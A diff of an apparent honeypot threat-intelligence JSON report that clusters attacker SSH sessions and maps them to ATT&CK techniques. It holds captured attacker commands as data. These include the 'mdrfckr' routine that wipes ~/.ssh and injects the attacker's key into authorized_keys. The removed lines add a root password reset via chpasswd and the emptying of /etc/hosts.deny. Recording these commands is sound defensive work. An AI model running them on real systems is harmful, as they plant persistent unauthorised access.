@@ -1,7 +1,7 @@
 {
-  "generated_at": "2026-03-22T20:24:26.040088+00:00",
-  "total_sessions_with_commands": 1,
-  "total_clusters": 1,
+  "generated_at": "2026-03-22T22:23:11.433224+00:00",
+  "total_sessions_with_commands": 6,
+  "total_clusters": 2,
   "campaign_clusters": 1,
   "singleton_clusters": 1,
   "highest_severity": "HIGH",
@@ -10,18 +10,13 @@
       "cluster_id": "CLU-001",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
+      "session_count": 5,
+      "unique_ip_count": 2,
       "ttps": [
         "T1021.004",
         "T1078",
-        "T1083",
-        "T1082",
-        "T1592",
         "T1070",
         "T1140",
-        "T1547",
-        "T1489",
         "T1105"
       ]
     }
@@ -47,12 +42,13 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 1,
+      "session_count": 5,
       "unique_ips": [
-        "180.184.176.74"
+        "197.211.55.20",
+        "180.93.172.213"
       ],
-      "unique_ip_count": 1,
-      "sequence_hash": "fcdd5e5ecdd14a2c",
+      "unique_ip_count": 2,
+      "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
           "id": "T1021.004",
@@ -63,18 +59,6 @@
           "name": "Valid Accounts"
         },
         {
-          "id": "T1083",
-          "name": "File & Directory Discovery"
-        },
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
-        },
-        {
           "id": "T1070",
           "name": "Indicator Removal"
         },
@@ -83,38 +67,87 @@
           "name": "Deobfuscate/Decode Files"
         },
         {
-          "id": "T1547",
-          "name": "Boot/Logon Autostart"
-        },
-        {
-          "id": "T1489",
-          "name": "Service Stop"
-        },
-        {
           "id": "T1105",
           "name": "T1105"
         }
       ],
       "representative_commands": [
         "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-        "cat /proc/cpuinfo | grep name | wc -l",
-        "echo \"root:vqKttDzuyI2B\"|chpasswd|bash",
-        "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
-        "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-        "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-        "ls -lh $(which ls)",
-        "which ls",
-        "crontab -l"
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
       ],
       "members": [
         {
-          "session_id": "IR-8a21bc701129",
-          "src_ip": "180.184.176.74",
+          "session_id": "IR-192c19738cd9",
+          "src_ip": "180.93.172.213",
           "country": "",
           "isp": "",
-          "command_count": 19,
-          "timestamp": "2026-03-22T19:21:51.931083Z"
+          "command_count": 2,
+          "timestamp": "2026-03-22T21:33:14.855649Z"
+        },
+        {
+          "session_id": "IR-69ccd099362c",
+          "src_ip": "197.211.55.20",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-03-22T21:35:54.289084Z"
+        },
+        {
+          "session_id": "IR-574cffd20362",
+          "src_ip": "180.93.172.213",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-03-22T21:37:36.597072Z"
+        },
+        {
+          "session_id": "IR-83eb0848f188",
+          "src_ip": "197.211.55.20",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-03-22T21:44:11.187552Z"
+        },
+        {
+          "session_id": "IR-b526780ba04d",
+          "src_ip": "197.211.55.20",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-03-22T21:50:28.136623Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-002",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "123.58.209.118"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "841e6ec5061717ea",
+      "ttps": [
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        }
+      ],
+      "representative_commands": [
+        "echo 'dGVzdA==' | base64 -d 2>/dev/null"
+      ],
+      "members": [
+        {
+          "session_id": "IR-98cfd2476192",
+          "src_ip": "123.58.209.118",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-03-22T21:45:12.569873Z"
         }
       ]
     }
